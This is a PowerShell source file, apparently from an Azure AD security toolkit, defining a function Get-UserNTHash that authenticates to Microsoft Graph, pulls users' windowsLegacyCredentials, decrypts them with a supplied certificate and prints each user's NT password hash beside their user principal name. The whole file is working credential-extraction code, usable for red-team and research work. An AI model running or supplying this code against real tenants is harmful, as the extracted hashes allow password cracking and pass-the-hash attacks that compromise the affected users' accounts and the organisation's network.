
# Gets users NT Hashes from Azure AD
# Dec 22nd 2022
function Get-UserNTHash
{
    [cmdletbinding()]
    Param(
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$False)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$True)]
        [string]$ClientPfxFileName,
        [Parameter(ParameterSetName='ClientPassword', Mandatory=$True)]
        [Parameter(ParameterSetName='ClientCert'    , Mandatory=$False)]
        [string]$ClientPassword,
        [Parameter(Mandatory=$False)]
        [string]$ClientPfxPassword,
        [Parameter(Mandatory=$True)]
        [string]$PfxFileName,
        [Parameter(Mandatory=$False)]
        [string]$PfxPassword,
        [Parameter(Mandatory=$False)]
        [guid]$TenantId,
        [Parameter(Mandatory=$True)]
        [guid]$ClientId,
        [Parameter(Mandatory=$False)]
        [String]$UserPrincipalName
    )
    Process
    {
        # Load certificates
        if(![string]::IsNullOrEmpty($ClientPfxFileName))
        {
            $clientCertificate = Load-Certificate -FileName $ClientPfxFileName -Password $ClientPfxPassword -Exportable
        }
        $decryptionCertificate = Load-Certificate -FileName $PfxFileName -Password $PfxPassword -Exportable

        # Parse the tenant name from the cert and get id if not provided
        if([string]::IsNullOrEmpty($TenantId))
        {
            $domainName = $decryptionCertificate.Subject.Split("-")[1].Trim()
            $TenantId = Get-TenantID -Domain $domainName
        }

        # Get access token
        $access_token = Get-DCaaSAccessToken -Certificate $clientCertificate -TenantId $TenantId -ClientId $ClientId -Password $ClientPassword
        
        $queryString = '$select=id,onPremisesImmutableId,onPremisesSecurityIdentifier,userPrincipalName,windowsLegacyCredentials'#,windowsSupplementalCredentials'
        if(![string]::IsNullOrEmpty($UserPrincipalName))
        {
            $queryString += "&`$filter=userPrincipalName eq '$UserPrincipalName'"
        }
        
        $results = Call-MSGraphAPI -AccessToken $access_token -API users -QueryString $queryString
        
        foreach($result in $results)
        {
            if($result.windowsLegacyCredentials)
            {
                $binLegacyCreds = Convert-B64ToByteArray -B64 $result.windowsLegacyCredentials
                $ADAuthInfo = Unprotect-ADAuthInfo -Data $binLegacyCreds -Certificate $decryptionCertificate
                if($ADAuthInfo)
                {
                    $binHash = $ADAuthInfo[8..($ADAuthInfo.length)]
                    [PSCustomObject][ordered]@{
                        "NTHash" = Convert-ByteArrayToHex -Bytes $binHash
                        "UserPrincipalName" = $result.UserPrincipalName
                    }
                }
                else
                {
                    Write-Verbose "Decryption failed: $($result.UserPrincipalName)"
                }
            }
            else
            {
                Write-Verbose "No NTHash:         $($result.UserPrincipalName)"
            }
        }
    }
}

